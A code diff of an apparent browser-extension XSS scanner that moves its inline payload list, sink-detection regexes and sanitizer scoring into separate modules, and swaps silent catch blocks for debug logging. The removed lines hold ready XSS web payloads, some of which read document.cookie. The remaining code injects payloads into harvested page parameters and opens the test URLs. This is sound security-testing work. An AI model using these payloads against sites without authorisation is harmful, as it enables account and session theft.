@@ -3,6 +3,8 @@
 
 import { utilsProxy as utils } from './vk-namespace.js';
 import { XSS_DATA } from './vk-payload.js';
+import { XSS_SCAN_PAYLOADS } from './vk-xss-data.js';
+import { analyzeDomSinks } from './vk-xss-sinks.js';
 
 let xssPoints = [];
 let xssFilterType = 'all';
@@ -10,192 +12,6 @@ let xssSearchText = '';
 let xssInterceptTimer = null;
 let xssInterceptActive = false;
 let xssInterceptCountdown = 0;
-
-const XSS_SCAN_PAYLOADS = [
-  { name: 'alert(1)', value: '<script>alert(1)</script>' },
-  { name: 'img onerror', value: '<img src=x onerror=alert(1)>' },
-  { name: 'svg onload', value: '<svg onload=alert(1)>' },
-  { name: 'body onload', value: '<body onload=alert(1)>' },
-  { name: 'svg script', value: '<svg><script>alert(1)</script></svg>' },
-  { name: 'details ontoggle', value: '<details open ontoggle=alert(1)>' },
-  { name: 'img src onerror', value: '<img src=1 onerror=alert(1)>' },
-  { name: 'input onfocus', value: '<input onfocus=alert(1) autofocus>' },
-  { name: 'marquee onstart', value: '<marquee onstart=alert(1)>' },
-  { name: 'select onchange', value: '<select onchange=alert(1)><option>1</option></select>' },
-  { name: 'textarea onfocus', value: '<textarea onfocus=alert(1) autofocus>' },
-  {
-    name: 'keyframe anim',
-    value:
-      '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
-  },
-  {
-    name: 'math xss',
-    value:
-      '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
-  },
-  { name: 'object data', value: '<object data="javascript:alert(1)">' },
-  { name: 'embed src', value: '<embed src="javascript:alert(1)">' },
-  { name: 'a href js', value: '<a href="javascript:alert(1)">click</a>' },
-  { name: 'window.location', value: "<script>window.location='javascript:alert(1)'</script>" },
-  { name: 'eval payload', value: "<script>eval('alert(1)')</script>" },
-  { name: 'fromCharCode', value: '<script>alert(String.fromCharCode(88,83,83))</script>' },
-  { name: 'constructor', value: "''.constructor.constructor('alert(1)')()" },
-];
-
-// ====== Context-Aware Payloads ======
-
-const CONTEXT_PAYLOADS = {
-  innerHTML: [
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '<details open ontoggle=alert(1)>',
-    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
-    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
-  ],
-  outerHTML: [
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '<details open ontoggle=alert(1)>',
-  ],
-  documentWrite: [
-    '<script>alert(1)</script>',
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-  ],
-  eval: [
-    'alert(1)',
-    'prompt(1)',
-    'confirm(1)',
-    'document.cookie',
-    "''.constructor.constructor('alert(1)')()",
-  ],
-  location: [
-    'javascript:alert(1)',
-    'data:text/html,<script>alert(1)</script>',
-    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
-  ],
-  setTimeout: ['alert(1)', 'document.cookie', "eval('alert(1)')"],
-  srcdoc: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
-  attribute: ['" onerror=alert(1) ', '" onfocus=alert(1) autofocus="', '" onmouseover=alert(1) "'],
-  url: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
-  insertAdjacentHTML: [
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '<details open ontoggle=alert(1)>',
-  ],
-  createContextualFragment: [
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '<details open ontoggle=alert(1)>',
-  ],
-  scriptSrc: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
-  iframeWrite: [
-    '<script>alert(parent.document.cookie)</script>',
-    '<img src=x onerror=alert(parent.document.cookie)>',
-  ],
-};
-
-const SINK_PATTERNS = [
-  { context: 'innerHTML', regex: /\.innerHTML\s*=|\.innerHTML\s*\+/g, severity: 'high' },
-  { context: 'outerHTML', regex: /\.outerHTML\s*=|\.outerHTML\s*\+/g, severity: 'high' },
-  { context: 'documentWrite', regex: /document\.write\(|document\.writeln\(/g, severity: 'high' },
-  { context: 'eval', regex: /\beval\s*\(|\bnew\s+Function\s*\(/g, severity: 'critical' },
-  { context: 'setTimeout', regex: /setTimeout\s*\(\s*['"`]/g, severity: 'high' },
-  { context: 'setInterval', regex: /setInterval\s*\(\s*['"`]/g, severity: 'high' },
-  {
-    context: 'location',
-    regex: /(?:window\.)?location\s*[\.\[]|location\s*=\s*['"`]/g,
-    severity: 'high',
-  },
-  { context: 'srcdoc', regex: /srcdoc\s*=\s*/g, severity: 'high' },
-  {
-    context: 'attribute',
-    regex: /setAttribute\s*\(\s*['"`](?:on[a-z]+|href|src|action|style)['"`]/gi,
-    severity: 'medium',
-  },
-  {
-    context: 'url',
-    regex: /(?:href|src|action)\s*=\s*(?:location|window\.location|document\.URL)/gi,
-    severity: 'medium',
-  },
-  { context: 'eval', regex: /\bexecScript\s*\(/g, severity: 'critical' },
-  { context: 'eval', regex: /\bFunction\s*\(\s*['"`]/g, severity: 'critical' },
-  {
-    context: 'innerHTML',
-    regex:
-      /(?:insertAdjacentHTML|\.append|\.before|\.after|\.insertBefore|\.replaceChildren)\s*\(/g,
-    severity: 'medium',
-  },
-  {
-    context: 'insertAdjacentHTML',
-    regex: /insertAdjacentHTML\s*\(\s*['"`]/g,
-    severity: 'high',
-  },
-  {
-    context: 'createContextualFragment',
-    regex: /createContextualFragment\s*\(/g,
-    severity: 'high',
-  },
-  {
-    context: 'scriptSrc',
-    regex: /\.src\s*=\s*(?:location|document\.URL|window\.location|[^"'\s]*\+[^"'\s]*)/g,
-    severity: 'critical',
-  },
-  {
-    context: 'iframeWrite',
-    regex: /(?:contentDocument|contentWindow\.document)\.write\s*\(/g,
-    severity: 'critical',
-  },
-  {
-    context: 'eval',
-    regex: /(?:chrome\.runtime\.sendMessage|browser\.runtime\.sendMessage)\s*\(\s*\[\s*['"`]/g,
-    severity: 'medium',
-  },
-  {
-    context: 'location',
-    regex: /(?:window\.)?open\s*\(\s*(?:location|document\.URL|window\.location)/g,
-    severity: 'high',
-  },
-  {
-    context: 'eval',
-    regex: /import\s*\(\s*(?:location|document\.URL|\+)/g,
-    severity: 'high',
-  },
-];
-
-const SANITIZER_PATTERNS = [
-  { name: 'DOMPurify', regex: /DOMPurify\.sanitize/i, reduction: 5 },
-  { name: 'Trusted Types', regex: /createPolicy|trustedTypes/i, reduction: 6 },
-  { name: 'escapeHtml', regex: /escapeHtml|escapeXML|htmlEncode|sanitizeHtml/i, reduction: 3 },
-  { name: 'textContent', regex: /\.textContent\s*=/, reduction: 4 },
-  { name: 'innerText', regex: /\.innerText\s*=/, reduction: 3 },
-  { name: 'encodeURIComponent', regex: /encodeURIComponent/i, reduction: 2 },
-  { name: 'TextEncoder', regex: /new\s+TextEncoder/i, reduction: 2 },
-  { name: 'JSON.stringify', regex: /JSON\.stringify/i, reduction: 1 },
-  { name: 'parseInt/parseFloat', regex: /\b(?:parseInt|parseFloat)\s*\(/, reduction: 4 },
-  { name: 'Number()', regex: /Number\s*\([^)]*\)/, reduction: 4 },
-  { name: 'typeof check', regex: /typeof\s+\w+\s*===?\s*['"`](?:string|number)/, reduction: 3 },
-  { name: 'CSP nonce', regex: /nonce[=:_-]/i, reduction: 3 },
-  { name: 'Angular sanitization', regex: /\$sce|DomSanitizer|sanitize\.html/i, reduction: 5 },
-  { name: 'Vue v-html', regex: /v-html/i, reduction: -2 },
-  { name: 'Sanitizer API', regex: /new\s+Sanitizer\b/i, reduction: 4 },
-  { name: 'URL validation', regex: /(?:new\s+URL|isURL|isValidUrl)\s*\(/, reduction: 2 },
-  {
-    name: 'innerHTML forbidden',
-    regex: /trusted-types\s+[^\s;]*\s+[^;]*innerHTML/i,
-    reduction: 5,
-  },
-];
-
-const SEVERITY_CONFIG = {
-  critical: { label: '严重', color: '#e74c3c', bg: '#fdecea', darkBg: 'rgba(231,76,60,0.15)' },
-  high: { label: '高危', color: '#e67e22', bg: '#fef9e7', darkBg: 'rgba(230,126,34,0.15)' },
-  medium: { label: '中危', color: '#f39c12', bg: '#fef9e7', darkBg: 'rgba(243,156,18,0.15)' },
-  low: { label: '低危', color: '#27ae60', bg: '#e8f8f0', darkBg: 'rgba(39,174,96,0.15)' },
-  info: { label: '信息', color: '#4A90E2', bg: '#eaf2fb', darkBg: 'rgba(74,144,226,0.15)' },
-};
-
-let domSinks = [];
 
 async function harvestXssParamsFromDom() {
   const tab = await utils.requireTabId();
@@ -214,7 +30,6 @@ async function harvestXssParamsFromDom() {
           try {
             fullUrl = new URL(url, pageUrl).href;
           } catch (_) {
-            /* invalid URL */
             return;
           }
           const key = `${fullUrl}|${param}|${method}`;
@@ -230,9 +45,7 @@ async function harvestXssParamsFromDom() {
             href.searchParams.forEach((_, key) => {
               addPoint('link', href.pathname + href.search, key, 'GET');
             });
-          } catch (_) {
-            /* malformed link href */
-          }
+          } catch (_) {}
         });
 
         document.querySelectorAll('form').forEach(form => {
@@ -250,253 +63,13 @@ async function harvestXssParamsFromDom() {
           currentUrl.searchParams.forEach((_, key) => {
             addPoint('url', currentUrl.pathname + currentUrl.search, key, 'GET');
           });
-        } catch (_) {
-          /* malformed current page URL */
-        }
+        } catch (_) {}
 
         return collected;
       },
       { world: 'ISOLATED' }
     )) || []
   );
-}
-
-// ====== DOM Sink Analysis ======
-
-async function analyzeDomSinks() {
-  const tab = await utils.requireTabId();
-  if (!tab) return [];
-  const statusEl = utils.get('xssscan-sink-status');
-  if (statusEl) {
-    statusEl.textContent = '正在分析 DOM XSS 汇点...';
-    statusEl.style.color = '#4A90E2';
-  }
-  try {
-    let rawSinks = await utils.execInTabData(
-      tab.id,
-      function () {
-        let sinks = [];
-        let scripts = document.querySelectorAll('script:not([src])');
-        scripts.forEach(function (s) {
-          let text = s.textContent || '';
-          let lines = text.split('\n');
-          lines.forEach(function (line, idx) {
-            let trimmed = line.trim();
-            if (!trimmed || trimmed.length < 5) return;
-            if (trimmed.indexOf('return ') === 0 && trimmed.length < 30) return;
-            sinks.push({ code: trimmed, line: idx + 1, source: 'inline' });
-          });
-        });
-        document.querySelectorAll('script[src]').forEach(function (s) {
-          sinks.push({ code: s.src || '', line: 0, source: 'external', isUrl: true });
-        });
-        let eventAttrs = document.querySelectorAll(
-          '[onclick],[onerror],[onload],[onmouseover],[onfocus],[onblur],[onchange],[onsubmit],[onkeydown],[onkeyup],[onkeypress]'
-        );
-        eventAttrs.forEach(function (el) {
-          let attrs = [];
-          el.getAttributeNames().forEach(function (n) {
-            if (n.indexOf('on') === 0 && el.getAttribute(n)) {
-              attrs.push({ attr: n, value: el.getAttribute(n) });
-            }
-          });
-          if (attrs.length > 0) {
-            sinks.push({
-              code: attrs
-                .map(function (a) {
-                  return `${a.attr}="${a.value}"`;
-                })
-                .join(' '),
-              line: 0,
-              source: 'event-attr',
-              tag: el.tagName.toLowerCase(),
-            });
-          }
-        });
-        let hrefs = document.querySelectorAll('a[href^="javascript:"]');
-        hrefs.forEach(function (a) {
-          sinks.push({
-            code: `href="${a.getAttribute('href') || ''}"`,
-            line: 0,
-            source: 'js-href',
-            tag: 'a',
-          });
-        });
-        return sinks;
-      },
-      { world: 'ISOLATED' }
-    );
-    rawSinks = rawSinks || [];
-    let analyzed = rawSinks.map(function (s) {
-      return analyzeSingleSink(s);
-    });
-    analyzed = analyzed.filter(function (s) {
-      return s.matched;
-    });
-    analyzed.sort(function (a, b) {
-      return b.score - a.score;
-    });
-    domSinks = analyzed;
-    renderDomSinks();
-    if (statusEl) {
-      statusEl.textContent = `分析完成，发现 ${analyzed.length} 个潜在 DOM XSS 汇点`;
-      statusEl.style.color = analyzed.length > 0 ? '#e67e22' : '#27ae60';
-    }
-    if (analyzed.length > 0) {
-      utils.showToast(`发现 ${analyzed.length} 个 DOM XSS 汇点`, 'warning');
-    } else {
-      utils.showToast('未发现 DOM XSS 汇点', 'info');
-    }
-    return analyzed;
-  } catch (e) {
-    if (statusEl) {
-      statusEl.textContent = `分析失败: ${e.message}`;
-      statusEl.style.color = '#e74c3c';
-    }
-    utils.showToast('DOM 分析失败', 'error');
-    return [];
-  }
-}
-
-function analyzeSingleSink(sink) {
-  let code = sink.code || '';
-  let matchedPatterns = [];
-  SINK_PATTERNS.forEach(function (sp) {
-    let regex = new RegExp(sp.regex.source, sp.regex.flags);
-    let matches = code.match(regex);
-    if (matches && matches.length > 0) {
-      matchedPatterns.push({ context: sp.context, severity: sp.severity, count: matches.length });
-    }
-  });
-  if (matchedPatterns.length === 0) {
-    return Object.assign({}, sink, { matched: false });
-  }
-  let sanitizers = [];
-  let totalReduction = 0;
-  SANITIZER_PATTERNS.forEach(function (sp) {
-    let regex = new RegExp(sp.regex.source, sp.regex.flags);
-    if (regex.test(code)) {
-      sanitizers.push(sp.name);
-      totalReduction += sp.reduction;
-    }
-  });
-  let baseScore = 8;
-  let hasCritical = matchedPatterns.some(function (m) {
-    return m.severity === 'critical';
-  });
-  let hasHigh = matchedPatterns.some(function (m) {
-    return m.severity === 'high';
-  });
-  if (hasCritical) baseScore = 9;
-  else if (hasHigh) baseScore = 7;
-  else baseScore = 5;
-  baseScore -= totalReduction;
-  baseScore += matchedPatterns.length > 2 ? 1 : 0;
-  if (sink.source === 'event-attr') baseScore += 1;
-  if (sink.source === 'js-href') baseScore += 2;
-  baseScore = Math.max(1, Math.min(10, baseScore));
-  let severity;
-  if (baseScore >= 8) severity = 'critical';
-  else if (baseScore >= 6) severity = 'high';
-  else if (baseScore >= 4) severity = 'medium';
-  else severity = 'low';
-  let contexts = matchedPatterns.map(function (m) {
-    return m.context;
-  });
-  let uniqueContexts = contexts.filter(function (v, i, a) {
-    return a.indexOf(v) === i;
-  });
-  return Object.assign({}, sink, {
-    matched: true,
-    contexts: uniqueContexts,
-    severity: severity,
-    score: baseScore,
-    sanitizers: sanitizers,
-    sinkCount: matchedPatterns.reduce(function (sum, m) {
-      return sum + m.count;
-    }, 0),
-  });
-}
-
-function getContextPayloads(sink) {
-  let payloads = [];
-  (sink.contexts || []).forEach(function (ctx) {
-    let ctxPayloads = CONTEXT_PAYLOADS[ctx];
-    if (ctxPayloads) {
-      payloads = payloads.concat(ctxPayloads);
-    }
-  });
-  let seen = {};
-  return payloads.filter(function (p) {
-    if (seen[p]) return false;
-    seen[p] = true;
-    return true;
-  });
-}
-
-function renderDomSinks() {
-  let container = utils.get('xssscan-sink-results');
-  if (!container) return;
-  if (domSinks.length === 0) {
-    utils.setEmpty('xssscan-sink-results', '未发现 DOM XSS 汇点');
-    return;
-  }
-  let html = '<div class="xssscan-sink-list">';
-  domSinks.forEach(function (sink, i) {
-    let sevConf = SEVERITY_CONFIG[sink.severity] || SEVERITY_CONFIG.info;
-    let shortCode = sink.code.length > 80 ? `${sink.code.substring(0, 77)}...` : sink.code;
-    let sanitizerTag =
-      sink.sanitizers.length > 0
-        ? `<span class="xssscan-sanitizer-tag">${sink.sanitizers.join(', ')}</span>`
-        : '';
-    let sourceLabels = {
-      inline: '内联JS',
-      external: '外部脚本',
-      'event-attr': '事件属性',
-      'js-href': 'JS链接',
-    };
-    let contextTags = (sink.contexts || [])
-      .map(function (c) {
-        return `<span class="xssscan-ctx-tag">${utils.escapeHtml(c)}</span>`;
-      })
-      .join('');
-    html += `<div class="xssscan-sink-item">
-<div class="xssscan-sink-header">
-<span class="xssscan-severity-badge" style="background:${sevConf.color}">${sevConf.label}</span>
-<span class="xssscan-score-badge">评分: ${sink.score}/10</span>
-<span class="xssscan-source-label">${sourceLabels[sink.source] || sink.source}</span>`;
-    if (sink.sinkCount > 1) {
-      html += `<span class="xssscan-count-tag">x${sink.sinkCount}</span>`;
-    }
-    html += sanitizerTag;
-    html += '</div>';
-    html += `<div class="xssscan-sink-code" title="${utils.escapeHtml(sink.code)}">${utils.escapeHtml(shortCode)}</div>`;
-    if (contextTags) {
-      html += `<div class="xssscan-sink-contexts">${contextTags}</div>`;
-    }
-    let ctxPayloads = getContextPayloads(sink);
-    if (ctxPayloads.length > 0) {
-      html += '<div class="xssscan-sink-payloads">';
-      ctxPayloads.slice(0, 3).forEach(function (p) {
-        html += `<code class="xssscan-sink-payload" title="${utils.escapeHtml(p)}">${utils.escapeHtml(p.length > 50 ? `${p.substring(0, 47)}...` : p)}</code>`;
-      });
-      if (ctxPayloads.length > 3) {
-        html += `<span class="xssscan-sink-more">+${ctxPayloads.length - 3}</span>`;
-      }
-      html += '</div>';
-    }
-    html += '</div>';
-  });
-  html += '</div>';
-  container.innerHTML = html;
-  container.querySelectorAll('.xssscan-sink-payload').forEach(function (el) {
-    el.style.cursor = 'pointer';
-    el.title = '点击复制';
-    el.addEventListener('click', function () {
-      utils.copyText(el.getAttribute('title'));
-      utils.showToast('已复制 Payload', 'success');
-    });
-  });
 }
 
 async function startXssIntercept() {
@@ -535,7 +108,7 @@ async function startXssIntercept() {
           }
         });
       } catch (e) {
-        /* JSON parse failure in response body */
+        console.debug('JSON parse failure in XSS intercept', e);
       }
     }
     function collectQueryParams(rawUrl, method) {
@@ -549,7 +122,7 @@ async function startXssIntercept() {
           });
         });
       } catch (_) {
-        /* network request interception failed */
+        console.debug('network request interception failed', _);
       }
     }
     function collectBodyParams(body, rawUrl, method) {
@@ -564,11 +137,11 @@ async function startXssIntercept() {
               method: method,
             });
           } catch (_) {
-            /* URL construction failed */
+            console.debug('URL construction failed', _);
           }
         });
       } catch (_) {
-        /* response param iteration failed */
+        console.debug('response param iteration failed', _);
       }
     }
     function processRequest(rawUrl, method, body) {
@@ -579,7 +152,7 @@ async function startXssIntercept() {
           let u = new URL(rawUrl, location.href);
           extractJsonParams(body, u.origin + u.pathname, method);
         } catch (e) {
-          /* malformed AJAX URL */
+          console.debug('malformed AJAX URL', e);
         }
       }
     }
@@ -631,7 +204,7 @@ async function startXssIntercept() {
         }
       }
     } catch (_) {
-      /* interceptor setup failed */
+      console.debug('interceptor setup failed', _);
     }
   }, 2000);
 }
@@ -658,7 +231,9 @@ async function stopXssIntercept() {
       delete window.__XSS_INTERCEPT__;
       delete window.__XSS_ORIGINAL__;
     })
-    .catch(() => {});
+    .catch(function (e) {
+      console.debug('XSS intercept stop failed', e);
+    });
 }
 
 function updateXssInterceptStatus() {
@@ -770,7 +345,7 @@ function buildXssTestUrl(point, payload) {
     }
     return url.href;
   } catch (_) {
-    /* URL construction failed */
+    console.debug('URL construction failed', _);
     return null;
   }
 }
@@ -871,7 +446,6 @@ async function handleBatchOpenXss() {
         );
         opened++;
       } catch (_) {
-        /* tab creation failed, try blob fallback */
         try {
           const escAttr = s =>
             s
@@ -884,7 +458,7 @@ async function handleBatchOpenXss() {
           chrome.tabs.create({ url: blobUrl, active: false });
           opened++;
         } catch (_) {
-          /* blob URL fallback also failed */
+          console.debug('blob URL fallback also failed', _);
         }
       }
     }
@@ -901,7 +475,7 @@ function buildTestUrl(point, payload) {
     urlObj.searchParams.set(point.param, payload);
     return urlObj.href;
   } catch (_) {
-    /* malformed URL */
+    console.debug('malformed URL in buildTestUrl', _);
   }
   return null;
 }
